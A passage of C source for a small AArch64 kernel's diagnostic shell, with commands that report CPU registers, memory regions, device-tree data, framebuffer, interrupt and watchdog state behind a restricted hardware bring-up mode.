    UNUSED(argument_count);
    UNUSED(arguments);
    cpu_system_registers_t registers;
    cpu_read_system_registers(&registers);
    fm_printf("CurrentEL:  EL%llu\n", registers.current_el);
    fm_printf("DAIF:       0x%016llx\n", registers.daif);
    fm_printf("MPIDR_EL1:  0x%016llx\n", registers.mpidr_el1);
    fm_printf("SCTLR_EL1:  0x%016llx\n", registers.sctlr_el1);
    fm_printf("TCR_EL1:    0x%016llx\n", registers.tcr_el1);
    fm_printf("TTBR0_EL1:  0x%016llx\n", registers.ttbr0_el1);
    fm_printf("TTBR1_EL1:  0x%016llx\n", registers.ttbr1_el1);
    fm_printf("MAIR_EL1:   0x%016llx\n", registers.mair_el1);
    fm_printf("VBAR_EL1:   0x%016llx\n", registers.vbar_el1);
    fm_printf("CNTFRQ_EL0: %llu Hz\n", registers.cntfrq_el0);
    return 0;
}

static int command_timer_frequency(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const u64 frequency = timer_frequency();
    fm_printf("%llu Hz\n", frequency);
    return frequency != 0U ? 0 : -1;
}

static int command_boot_modules(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const fbr34ker_handoff_t *handoff = fbr34ker_handoff_active();
    if (handoff == NULL || handoff->version < FBR34KER_HANDOFF_VERSION_2) {
        fm_printf("No loader boot-module table is active.\n");
        return 0;
    }
    fm_printf("Boot modules (%u):\n", handoff->boot_module_count);
    for (u32 index = 0U; index < handoff->boot_module_count; ++index) {
        const fbr34ker_handoff_boot_module_t *module = &handoff->boot_modules[index];
        fm_printf("  [%u] base=0x%016llx size=%llu type=%u flags=0x%08x\n",
                  index, (u64)(usize)module->base, module->size,
                  module->type, module->flags);
    }
    fm_printf("Execution policy: %s\n",
              hardware_probe_modules_allowed() ? "available" : "LOCKED");
    return 0;
}

static int command_probe_status(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const hardware_probe_status_t status = hardware_probe_status();
    fm_printf("Physical probe:  %s\n", status.active ? "active" : "inactive");
    fm_printf("Image policy:    %s\n", status.immutable ? "immutable read-only" : "unlockable");
    fm_printf("Handoff reviewed:%s\n", status.handoff_reviewed ? " yes" : " no");
    fm_printf("Interrupts:      %s / delivery remains masked until unlock\n",
              status.interrupts_validated ? "validated" : "not validated");
    fm_printf("Framebuffer:     %s / writes %s\n",
              status.framebuffer_validated ? "metadata validated" : "not validated",
              hardware_probe_framebuffer_writes_allowed() ? "allowed" : "LOCKED");
    fm_printf("Watchdog:        %s / mutation %s\n",
              status.watchdog_validated ? "validated" : "not validated",
              hardware_probe_watchdog_mutation_allowed() ? "allowed" : "LOCKED");
    fm_printf("Power actions:   %s\n",
              hardware_probe_power_actions_allowed() ? "allowed" : "LOCKED");
    fm_printf("Modules:         %s\n",
              hardware_probe_modules_allowed() ? "allowed" : "LOCKED");
    return 0;
}

static int command_probe_validate(int argument_count, char **arguments)
{
    if (argument_count != 3 || fm_strcmp(arguments[2], "acknowledge") != 0) {
        fm_printf("usage: probe-validate <interrupts|framebuffer|watchdog|power> acknowledge\n");
        return -1;
    }
    if (fm_strcmp(arguments[1], "interrupts") == 0) {
        if (hardware_probe_immutable()) {
            fm_printf("immutable probe image: interrupt mutation is disabled\n");
            return -1;
        }
        if ((platform_features() & PLATFORM_FEATURE_INTERRUPTS) == 0U) {
            fm_printf("interrupt controller unsupported\n");
            return -1;
        }
        const bool passed = platform_interrupt_self_test();
        (void)hardware_probe_mark_validated(HARDWARE_PROBE_FEATURE_INTERRUPTS, passed);
        fm_printf("interrupt validation: %s; IRQ delivery remains masked\n",
                  passed ? "passed" : "FAILED");
        return passed ? 0 : -1;
    }
    if (fm_strcmp(arguments[1], "framebuffer") == 0) {
        platform_framebuffer_t framebuffer;
        const bool passed = platform_framebuffer_info(&framebuffer);
        (void)hardware_probe_mark_validated(HARDWARE_PROBE_FEATURE_FRAMEBUFFER, passed);
        fm_printf("framebuffer metadata validation: %s; no pixels were written\n",
                  passed ? "passed" : "FAILED");
        return passed ? 0 : -1;
    }
    if (fm_strcmp(arguments[1], "watchdog") == 0) {
        if (hardware_probe_immutable()) {
            fm_printf("immutable probe image: watchdog mutation is disabled\n");
            return -1;
        }
        const bool passed = watchdog_self_test();
        (void)hardware_probe_mark_validated(HARDWARE_PROBE_FEATURE_WATCHDOG, passed);
        fm_printf("watchdog reversible validation: %s\n",
                  passed ? "passed" : "unsupported or FAILED");
        return passed ? 0 : -1;
    }
    if (fm_strcmp(arguments[1], "power") == 0) {
        const bool available = (platform_features() & PLATFORM_FEATURE_POWER) != 0U;
        (void)hardware_probe_mark_validated(HARDWARE_PROBE_FEATURE_POWER, available);
        fm_printf("power callback metadata: %s; no power action was invoked\n",
                  available ? "accepted" : "unsupported");
        return available ? 0 : -1;
    }
    fm_printf("unknown probe feature: %s\n", arguments[1]);
    return -1;
}

static void print_compatibility_line(const char *name,
                                     hardware_compatibility_state_t state)
{
    fm_printf("%-28s %s\n", name, hardware_compatibility_state_name(state));
}

static int command_compatibility(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    print_compatibility_line("Boot handoff", hardware_probe_handoff_state());
    print_compatibility_line("Console output", hardware_probe_console_output_state());
    print_compatibility_line("Console input", hardware_probe_console_input_state());
    print_compatibility_line("Monotonic timer", hardware_probe_timer_state());
    print_compatibility_line("Memory ownership", hardware_probe_memory_state());
    print_compatibility_line("Device tree", hardware_probe_device_tree_state());
    print_compatibility_line("Interrupt controller", hardware_probe_interrupt_state());
    print_compatibility_line("Watchdog", hardware_probe_watchdog_state());
    print_compatibility_line("Framebuffer", hardware_probe_framebuffer_state());
    print_compatibility_line("Modules", hardware_probe_module_state());
    print_compatibility_line("Power actions", hardware_probe_power_state());
    return hardware_probe_memory_state() == HARDWARE_COMPAT_PASS &&
           hardware_probe_timer_state() == HARDWARE_COMPAT_PASS ? 0 : -1;
}

static int command_handoff(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const fbr34ker_handoff_t *handoff = fbr34ker_handoff_active();
    if (handoff == NULL) {
        fm_printf("No external loader handoff is active.\n");
        return 0;
    }
    fm_printf("Version:        %u\n", handoff->version);
    fm_printf("Structure size: %u\n", handoff->structure_size);
    fm_printf("Monitor:        0x%016llx + %llu bytes\n",
              handoff->monitor_base, handoff->monitor_size);
    fm_printf("Memory regions: %u\n", handoff->memory_region_count);
    fm_printf("Device tree:    0x%016llx + %llu bytes\n",
              (u64)(usize)handoff->device_tree, handoff->device_tree_size);
    if (handoff->version >= FBR34KER_HANDOFF_VERSION_2) {
        fm_printf("Flags:          0x%016llx\n", handoff->flags);
        fm_printf("Boot modules:   %u\n", handoff->boot_module_count);
        fm_printf("Loader ID:      0x%016llx\n", handoff->loader_identifier);
    }
    if (handoff->version >= FBR34KER_HANDOFF_VERSION_4) {
        fm_printf("Entry EL:       EL%u\n", handoff->entry_exception_level);
        fm_printf("Page granule:   %u bytes\n", handoff->page_granule);
        fm_printf("Boot CPU ID:    %u\n", handoff->boot_cpu_id);
        fm_printf("Firmware rev:   0x%016llx\n", handoff->firmware_revision);
        fm_printf("Service table:  0x%016llx + %u bytes\n",
                  (u64)(usize)handoff->platform_services,
                  handoff->platform_services_size);
    }
    return 0;
}

static int command_bringup_status(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    fm_printf("Bring-up shell: %s\n", bringup_mode_name());
    if (bringup_restricted()) {
        fm_printf("Mutating commands and dynamic module execution are blocked.\n");
        fm_printf("Use 'bringup-exit unlock' only after reviewing the handoff.\n");
    }
    return 0;
}

static int command_bringup_enter(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    bringup_enter();
    fm_printf("Restricted hardware bring-up mode enabled.\n");
    return 0;
}

static int command_bringup_exit(int argument_count, char **arguments)
{
    if (argument_count != 2 || fm_strcmp(arguments[1], "unlock") != 0) {
        fm_printf("usage: bringup-exit unlock\n");
        return -1;
    }
    (void)hardware_probe_mark_reviewed();
    bringup_exit();
    if (bringup_restricted()) {
        fm_printf("This physical probe image is permanently read-only.\n");
        return -1;
    }
    fm_printf("Restricted mode disabled; full shell commands are now available.\n");
    return 0;
}

static int command_console_test(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    fm_printf("console-test: ASCII 0123456789 abcdef ABCDEF []{}<>\n");
    fm_printf("console-test: CRLF and flush path complete\n");
    platform_console_flush();
    return (platform_features() & PLATFORM_FEATURE_CONSOLE_OUTPUT) != 0U ? 0 : -1;
}

static int command_console_history(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const console_history_stats_t stats = console_history_stats();
    const usize copied = console_history_copy(console_history_snapshot,
                                               sizeof(console_history_snapshot));
    fm_printf("Console ring: retained=%llu total=%llu overwritten=%llu\n",
              (u64)stats.retained_characters, stats.total_characters,
              stats.overwritten_characters);
    console_write_n(console_history_snapshot, copied);
    if (copied != 0U && console_history_snapshot[copied - 1U] != '\n') {
        console_putc('\n');
    }
    return 0;
}

static int command_console_transports(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const framebuffer_console_stats_t fb = framebuffer_console_stats();
    fm_printf("Primary console: %s\n", platform_console_transport_name());
    fm_printf("Memory ring:     enabled (%u bytes)\n", CONSOLE_HISTORY_CAPACITY);
    fm_printf("Semihosting:     %s%s\n",
              platform_semihosting_available() ? "available" : "unavailable",
              console_semihosting_enabled() ? ", mirrored" : "");
    fm_printf("Framebuffer:     %s%s\n", fb.available ? "available" : "unavailable",
              fb.enabled ? ", enabled" : "");
    return 0;
}

static int command_console_semihosting(int argument_count, char **arguments)
{
    if (argument_count != 2 ||
        (fm_strcmp(arguments[1], "on") != 0 && fm_strcmp(arguments[1], "off") != 0)) {
        fm_printf("usage: console-semihosting <on|off>\n");
        return -1;
    }
    const bool enabled = fm_strcmp(arguments[1], "on") == 0;
    if (!console_semihosting_set(enabled)) {
        fm_printf("semihosting transport unavailable\n");
        return -1;
    }
    fm_printf("semihosting mirror %s\n", enabled ? "enabled" : "disabled");
    return 0;
}

static int command_timer_test(int argument_count, char **arguments)
{
    u64 requested_ms = 10U;
    if (argument_count == 2) {
        if (!parse_u64(arguments[1], &requested_ms) || requested_ms == 0U ||
            requested_ms > 250U) {
            fm_printf("usage: timer-test [1..250 ms]\n");
            return -1;
        }
    } else if (argument_count != 1) {
        fm_printf("usage: timer-test [1..250 ms]\n");
        return -1;
    }
    const u64 frequency = timer_frequency();
    const u64 start_ticks = timer_ticks();
    const u64 start_ms = timer_uptime_ms();
    if (frequency == 0U) {
        fm_printf("timer-test: invalid zero frequency\n");
        return -1;
    }
    if (frequency > U64_MAX_VALUE / requested_ms) {
        fm_printf("timer-test: frequency is outside the safe arithmetic range\n");
        return -1;
    }
    u64 target_ticks = (frequency * requested_ms) / 1000U;
    if (target_ticks == 0U) target_ticks = 1U;
    u64 current = start_ticks;
    bool advanced = false;
    for (u64 spins = 0U; spins < 50000000ULL; ++spins) {
        current = timer_ticks();
        if (current < start_ticks) {
            fm_printf("timer-test: counter moved backwards\n");
            return -1;
        }
        if (current - start_ticks >= target_ticks) {
            advanced = true;
            break;
        }
        if ((spins & 0xffffU) == 0U) watchdog_service();
        __asm__ volatile("yield");
    }
    const u64 end_ms = timer_uptime_ms();
    if (!advanced || end_ms < start_ms) {
        fm_printf("timer-test: timer did not advance within the safety budget\n");
        return -1;
    }
    fm_printf("timer-test: frequency=%llu Hz requested=%llu ms measured=%llu ms ticks=%llu\n",
              frequency, requested_ms, end_ms - start_ms, current - start_ticks);
    return 0;
}

static int command_irq_test(int argument_count, char **arguments)
{
    u64 interrupt_id = 0U;
    if (argument_count != 2 || !parse_u64(arguments[1], &interrupt_id) ||
        interrupt_id > 0xfffffffeU) {
        fm_printf("usage: irq-test <0..4294967294>\n");
        return -1;
    }
    if ((platform_features() & PLATFORM_FEATURE_INTERRUPTS) == 0U) {
        fm_printf("irq-test: interrupt-controller service unavailable\n");
        return -1;
    }
    if (!platform_interrupt_set_enabled((u32)interrupt_id, true)) {
        fm_printf("irq-test: loader rejected IRQ enable for %llu; check interrupt configuration\n",
                  interrupt_id);
        return -1;
    }
    const bool disabled = platform_interrupt_set_enabled((u32)interrupt_id, false);
    if (disabled) {
        fm_printf("irq-test: IRQ %llu enable and disable callbacks both succeeded\n",
                  interrupt_id);
    } else {
        fm_printf("irq-test: IRQ %llu enable succeeded but disable FAILED; interrupt may remain enabled\n",
                  interrupt_id);
    }
    return disabled ? 0 : -1;
}

static int command_memory_check(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const memory_region_t *regions = NULL;
    const u64 count = platform_memory_regions(&regions);
    bool valid = regions != NULL && count != 0U;
    u64 previous_end = 0U;
    for (u64 index = 0U; valid && index < count; ++index) {
        const memory_region_t *region = &regions[index];
        if (region->size == 0U || region->base > U64_MAX_VALUE - region->size) {
            valid = false;
            break;
        }
        const u64 end = region->base + region->size;
        if (index != 0U && region->base < previous_end) valid = false;
        previous_end = end;
    }
    const fbr34ker_handoff_t *handoff = fbr34ker_handoff_active();
    const bool handoff_ok = handoff == NULL || fbr34ker_handoff_valid(handoff);
    const bool heap_ok = allocator_check();
    const bool stack_ok = stack_guard_check();
    fm_printf("Memory map: %s (%llu regions)\n", valid ? "ok" : "INVALID", count);
    fm_printf("Handoff:    %s\n", handoff_ok ? "ok" : "INVALID");
    fm_printf("Heap:       %s\n", heap_ok ? "ok" : "CORRUPT");
    fm_printf("Stack:      %s\n", stack_ok ? "ok" : "CORRUPT");
    return valid && handoff_ok && heap_ok && stack_ok ? 0 : -1;
}

static int command_uptime(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const u64 milliseconds = timer_uptime_ms();
    fm_printf("%llu.%03llu seconds\n", milliseconds / 1000U,
              milliseconds % 1000U);
    return 0;
}

static int command_regions(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const memory_region_t *regions = NULL;
    const u64 count = platform_memory_regions(&regions);
    fm_printf("Known regions (%llu):\n", count);
    for (u64 index = 0U; index < count; ++index) {
        const memory_region_t *region = &regions[index];
        fm_printf("  0x%016llx..0x%016llx  %s  attr=0x%02x  %s\n",
                  region->base, region->base + region->size,
                  region_type_name(region->type), region->attributes,
                  region->name);
    }
    return 0;
}

static int command_heap(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const allocator_stats_t stats = allocator_stats();
    fm_printf("Heap: 0x%016llx..0x%016llx\n",
              allocator_base(), allocator_limit());
    fm_printf("Used: %llu / %llu bytes; remaining: %llu\n",
              (u64)stats.used, (u64)stats.capacity, (u64)stats.remaining);
    fm_printf("Allocations: %llu total, %llu active, %llu frees, %llu failures\n",
              (u64)stats.allocations, (u64)stats.active_allocations,
              (u64)stats.frees, (u64)stats.failed_allocations);
    fm_printf("Integrity: corruptions=%llu double-frees=%llu\n",
              (u64)stats.corruptions, (u64)stats.double_frees);
    fm_printf("Dynamic module slots: %u x %u bytes (static, reusable)\n",
              FBR34KER_MODULE_MAX_DYNAMIC, FBR34KER_MODULE_MAX_CONTAINER_SIZE);
    return 0;
}

static int command_log(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    log_dump();
    return 0;
}

static int command_dt_info(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    device_tree_summary_t summary;
    if (!device_tree_summary(&summary)) {
        fm_printf("No validated device tree is active.\n");
        return -1;
    }
    fm_printf("FDT: 0x%016llx + %u bytes, version %u\n",
              (u64)(usize)device_tree_blob(), summary.total_size,
              summary.version);
    fm_printf("Structure: %u bytes; strings: %u bytes\n",
              summary.structure_size, summary.strings_size);
    fm_printf("Nodes: %u; properties: %u\n", summary.node_count,
              summary.property_count);
    return 0;
}

static int command_dt_node(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-node <path>\n");
        return -1;
    }
    if (device_tree_print_node(arguments[1]) < 0) {
        fm_printf("device-tree node not found or tree malformed: %s\n",
                  arguments[1]);
        return -1;
    }
    return 0;
}

static int command_dt_find(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-find <term>\n");
        return -1;
    }
    const int count = device_tree_find(arguments[1]);
    if (count < 0) {
        fm_printf("device tree unavailable or malformed\n");
        return -1;
    }
    fm_printf("%d match(es)\n", count);
    return 0;
}

static int command_dt_property(int argument_count, char **arguments)
{
    if (argument_count != 3) {
        fm_printf("usage: dt-property <path> <property>\n");
        return -1;
    }
    if (device_tree_print_property(arguments[1], arguments[2]) != 0) {
        fm_printf("property not found\n");
        return -1;
    }
    return 0;
}

static int command_dt_compatible(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-compatible <string>\n");
        return -1;
    }
    const int count = device_tree_find_compatible(arguments[1]);
    if (count < 0) {
        fm_printf("device tree unavailable or malformed\n");
        return -1;
    }
    fm_printf("%d match(es)\n", count);
    return 0;
}

static int command_dt_reg(int argument_count, char **arguments)
{
    if (argument_count < 2 || argument_count > 3) {
        fm_printf("usage: dt-reg <path> [index]\n");
        return -1;
    }
    u64 requested = 0U;
    if (argument_count == 3 && (!parse_u64(arguments[2], &requested) ||
                                requested > 0xffffffffU)) {
        fm_printf("invalid reg index\n");
        return -1;
    }
    device_tree_reg_t reg;
    if (!device_tree_get_reg(arguments[1], (u32)requested, &reg)) {
        fm_printf("reg entry not found or unsupported cell width\n");
        return -1;
    }
    fm_printf("%s reg[%u]: address=0x%016llx size=0x%016llx "
              "(address-cells=%u size-cells=%u)\n",
              arguments[1], (u32)requested, reg.address, reg.size,
              reg.address_cells, reg.size_cells);
    return 0;
}

static int command_dt_alias(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-alias <name>\n");
        return -1;
    }
    char path[DEVICE_TREE_MAX_STRING];
    if (!device_tree_resolve_alias(arguments[1], path, sizeof(path))) {
        fm_printf("alias not found\n");
        return -1;
    }
    fm_printf("%s\n", path);
    return 0;
}

static int command_dt_stdout(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    char path[DEVICE_TREE_MAX_STRING];
    if (!device_tree_stdout_path(path, sizeof(path))) {
        fm_printf("stdout path not present\n");
        return -1;
    }
    fm_printf("%s\n", path);
    return 0;
}

static int print_dt_cells(const char *path, const char *property)
{
    u32 values[16];
    u32 count = 0U;
    if (!device_tree_get_cells(path, property, values, ARRAY_COUNT(values), &count)) {
        fm_printf("property missing, malformed, or exceeds 16 cells\n");
        return -1;
    }
    fm_printf("%s:%s (%u cells):", path, property, count);
    for (u32 index = 0U; index < count; ++index) fm_printf(" 0x%08x", values[index]);
    fm_printf("\n");
    return 0;
}

static int command_dt_cells(int argument_count, char **arguments)
{
    if (argument_count != 3) {
        fm_printf("usage: dt-cells <path> <property>\n");
        return -1;
    }
    return print_dt_cells(arguments[1], arguments[2]);
}

static int command_dt_interrupts(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-interrupts <path>\n");
        return -1;
    }
    return print_dt_cells(arguments[1], "interrupts");
}

static int command_dt_clocks(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-clocks <path>\n");
        return -1;
    }
    return print_dt_cells(arguments[1], "clocks");
}

static int command_dt_clock(int argument_count, char **arguments)
{
    if (argument_count != 2) {
        fm_printf("usage: dt-clock <path>\n");
        return -1;
    }
    u64 frequency = 0U;
    if (!device_tree_get_clock_frequency(arguments[1], &frequency)) {
        fm_printf("clock-frequency missing or malformed\n");
        return -1;
    }
    fm_printf("%s clock-frequency=%llu Hz\n", arguments[1], frequency);
    return 0;
}

static void print_feature(u64 features, u64 bit, const char *name)
{
    fm_printf("  %s: %s\n", name, (features & bit) != 0U ? "yes" : "no");
}

static int command_platform_features(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const u64 features = platform_features();
    fm_printf("Platform feature mask: 0x%016llx\n", features);
    print_feature(features, PLATFORM_FEATURE_CONSOLE_OUTPUT, "console output");
    print_feature(features, PLATFORM_FEATURE_CONSOLE_INPUT, "console input");
    print_feature(features, PLATFORM_FEATURE_CONSOLE_FLUSH, "console flush");
    print_feature(features, PLATFORM_FEATURE_TIMER, "timer");
    print_feature(features, PLATFORM_FEATURE_POWER, "power actions");
    print_feature(features, PLATFORM_FEATURE_FRAMEBUFFER, "framebuffer");
    print_feature(features, PLATFORM_FEATURE_FRAMEBUFFER_FLUSH, "framebuffer flush");
    print_feature(features, PLATFORM_FEATURE_INTERRUPTS, "interrupt controller");
    print_feature(features, PLATFORM_FEATURE_WATCHDOG_CONFIGURE, "watchdog configure");
    print_feature(features, PLATFORM_FEATURE_WATCHDOG_KICK, "watchdog kick");
    print_feature(features, PLATFORM_FEATURE_MEMORY_CONSOLE, "memory console ring");
    print_feature(features, PLATFORM_FEATURE_SEMIHOSTING, "semihosting");
    print_feature(features, PLATFORM_FEATURE_DIRECT_GIC, "direct GIC driver");
    print_feature(features, PLATFORM_FEATURE_DIRECT_PL011, "validated direct PL011 fallback");
    return 0;
}

static const char *pixel_format_name(u32 format)
{
    switch (format) {
    case FBR34KER_PIXEL_FORMAT_XRGB8888: return "XRGB8888";
    case FBR34KER_PIXEL_FORMAT_ARGB8888: return "ARGB8888";
    case FBR34KER_PIXEL_FORMAT_BGRA8888: return "BGRA8888";
    case FBR34KER_PIXEL_FORMAT_RGB565: return "RGB565";
    default: return "unknown";
    }
}

static int command_service_health(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    fm_printf("Callback service health (soft post-return budgets):\n");
    for (u32 index = 0U; index < SERVICE_GUARD_COUNT; ++index) {
        const service_guard_status_t status = service_guard_status((service_guard_id_t)index);
        fm_printf("%-20s calls=%llu failures=%llu overruns=%llu recursive=%llu state=%s\n",
                  service_guard_name((service_guard_id_t)index), status.calls,
                  status.failures, status.overruns, status.recursive_denials,
                  status.disabled ? "DISABLED" : (status.active ? "ACTIVE" : "ready"));
    }
    return 0;
}

static int command_display_info(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    platform_framebuffer_t framebuffer;
    if (!platform_framebuffer_info(&framebuffer)) {
        fm_printf("No validated framebuffer is active.\n");
        return -1;
    }
    fm_printf("Framebuffer: 0x%016llx + %llu bytes\n",
              framebuffer.base, framebuffer.size);
    fm_printf("Geometry:    %ux%u, stride %u pixels, rotation %u\n",
              framebuffer.width, framebuffer.height,
              framebuffer.pixels_per_row, framebuffer.rotation);
    fm_printf("Format:      %s (%u bytes/pixel)\n",
              pixel_format_name(framebuffer.pixel_format),
              framebuffer.bytes_per_pixel);
    const framebuffer_console_stats_t stats = framebuffer_console_stats();
    fm_printf("Text console: %s, %ux%u cells, cursor %u,%u, chars=%llu scrolls=%llu\n",
              stats.enabled ? "enabled" : "disabled", stats.columns, stats.rows,
              stats.cursor_column, stats.cursor_row, stats.rendered_characters,
              stats.scroll_count);
    return 0;
}

static int command_display_clear(int argument_count, char **arguments)
{
    u64 color = 0U;
    if (argument_count != 2 || !parse_u64(arguments[1], &color) ||
        color > 0xffffffffU) {
        fm_printf("usage: display-clear <32-bit-color>\n");
        return -1;
    }
    if (!hardware_probe_framebuffer_writes_allowed()) {
        fm_printf("framebuffer writes locked by defensive hardware mode\n");
        return -1;
    }
    if (!platform_framebuffer_clear((u32)color)) {
        fm_printf("framebuffer clear failed or framebuffer unavailable\n");
        return -1;
    }
    fm_printf("framebuffer cleared\n");
    return 0;
}

static int command_display_console(int argument_count, char **arguments)
{
    if (argument_count == 1 ||
        (argument_count == 2 && fm_strcmp(arguments[1], "status") == 0)) {
        const framebuffer_console_stats_t stats = framebuffer_console_stats();
        fm_printf("framebuffer console: available=%s enabled=%s geometry=%ux%u cursor=%u,%u\n",
                  stats.available ? "yes" : "no", stats.enabled ? "yes" : "no",
                  stats.columns, stats.rows, stats.cursor_column, stats.cursor_row);
        return stats.available ? 0 : -1;
    }
    if (argument_count != 2 ||
        (fm_strcmp(arguments[1], "on") != 0 && fm_strcmp(arguments[1], "off") != 0)) {
        fm_printf("usage: display-console <status|on|off>\n");
        return -1;
    }
    const bool enabled = fm_strcmp(arguments[1], "on") == 0;
    if (enabled && !hardware_probe_framebuffer_writes_allowed()) {
        fm_printf("framebuffer writes locked by defensive hardware mode\n");
        return -1;
    }
    if (!framebuffer_console_set_enabled(enabled)) {
        fm_printf("framebuffer console unavailable\n");
        return -1;
    }
    if (enabled) (void)framebuffer_console_clear();
    fm_printf("framebuffer console %s\n", enabled ? "enabled" : "disabled");
    return 0;
}

static int command_display_test(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_framebuffer_writes_allowed()) {
        fm_printf("framebuffer writes locked by defensive hardware mode\n");
        return -1;
    }
    if (!framebuffer_console_set_enabled(true)) {
        fm_printf("framebuffer console unavailable\n");
        return -1;
    }
    (void)framebuffer_console_clear();
    framebuffer_console_write("FBR34KER 0.3.0 FRAMEBUFFER TEST\n");
    framebuffer_console_write("ABCDEFGHIJKLMNOPQRSTUVWXYZ\n0123456789 []{} <> /\\ +-=_!?\n");
    for (u32 line = 0U; line < 6U; ++line) {
        framebuffer_console_write("SCROLL LINE ");
        framebuffer_console_putc((char)('0' + line));
        framebuffer_console_putc('\n');
    }
    fm_printf("display-test: rendered and flushed\n");
    return 0;
}

static int command_irq_info(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const interrupt_stats_t stats = interrupt_stats();
    fm_printf("Controller: %s (%s); delivery: %s\n",
              stats.controller_available ? "available" : "unavailable",
              platform_interrupt_controller_name(),
              stats.delivery_enabled ? "enabled" : "masked");
    fm_printf("Delivered=%llu handled=%llu unhandled=%llu spurious=%llu "
              "last=0x%08x\n", stats.delivered, stats.handled,
              stats.unhandled, stats.spurious, stats.last_interrupt);
    return 0;
}

static int command_irq_enable(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_interrupt_mutation_allowed()) {
        fm_printf("IRQ mutation locked; validate and leave defensive mode first\n");
        return -1;
    }
    if (!interrupt_set_delivery(true)) {
        fm_printf("interrupt controller unavailable\n");
        return -1;
    }
    fm_printf("IRQ delivery enabled\n");
    return 0;
}

static int command_irq_disable(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_interrupt_mutation_allowed()) {
        fm_printf("IRQ mutation locked by defensive hardware mode\n");
        return -1;
    }
    (void)interrupt_set_delivery(false);
    fm_printf("IRQ delivery masked\n");
    return 0;
}

static int command_irq_selftest(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if ((platform_features() & PLATFORM_FEATURE_INTERRUPTS) == 0U) {
        fm_printf("irq-selftest: unsupported\n");
        return -1;
    }
    if (hardware_probe_active()) {
        fm_printf("use probe-validate interrupts acknowledge in defensive mode\n");
        return -1;
    }
    const bool passed = platform_interrupt_self_test();
    fm_printf("irq-selftest: %s (%s)\n", passed ? "passed" : "FAILED",
              platform_interrupt_controller_name());
    return passed ? 0 : -1;
}

static int command_platform_selftest(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const u64 features = platform_features();
    const u64 first = timer_ticks();
    const u64 second = timer_ticks();
    const bool timer_ok = timer_frequency() != 0U && second >= first;
    const bool console_ok = (features & PLATFORM_FEATURE_CONSOLE_OUTPUT) != 0U;
    const framebuffer_console_stats_t fb = framebuffer_console_stats();
    const bool irq_ok = (features & PLATFORM_FEATURE_INTERRUPTS) == 0U ||
                        hardware_probe_active() || platform_interrupt_self_test();
    fm_printf("platform-selftest: console=%s timer=%s irq=%s framebuffer=%s\n",
              console_ok ? "ok" : "FAILED", timer_ok ? "ok" : "FAILED",
              irq_ok ? "ok" : "FAILED", fb.available ? "available" : "unsupported");
    return console_ok && timer_ok && irq_ok ? 0 : -1;
}

static int command_watchdog_info(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    const watchdog_status_t status = watchdog_status();
    fm_printf("Configure: %s; kick: %s; armed: %s\n",
              status.configure_available ? "available" : "unavailable",
              status.kick_available ? "available" : "unavailable",
              status.armed ? "yes" : "no");
    fm_printf("Timeout=%llu ms kicks=%llu last-kick=%llu ms\n",
              status.timeout_ms, status.kick_count, status.last_kick_ms);
    return 0;
}

static int command_watchdog_arm(int argument_count, char **arguments)
{
    u64 timeout = 0U;
    if (!hardware_probe_watchdog_mutation_allowed()) {
        fm_printf("watchdog mutation locked by defensive hardware mode\n");
        return -1;
    }
    if (argument_count != 2 || !parse_u64(arguments[1], &timeout) ||
        !watchdog_arm(timeout)) {
        fm_printf("unable to arm watchdog; use 100..600000 ms and verify services\n");
        return -1;
    }
    fm_printf("watchdog armed for %llu ms\n", timeout);
    return 0;
}

static int command_watchdog_pet(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_watchdog_mutation_allowed()) {
        fm_printf("watchdog mutation locked by defensive hardware mode\n");
        return -1;
    }
    if (!watchdog_kick()) {
        fm_printf("watchdog kick service unavailable\n");
        return -1;
    }
    fm_printf("watchdog kicked\n");
    return 0;
}

static int command_watchdog_disarm(int argument_count, char **arguments)
{
    UNUSED(argument_count);
    UNUSED(arguments);
    if (!hardware_probe_watchdog_mutation_allowed()) {
        fm_printf("watchdog mutation locked by defensive hardware mode\n");
        return -1;
    }
    if (!watchdog_disarm()) {
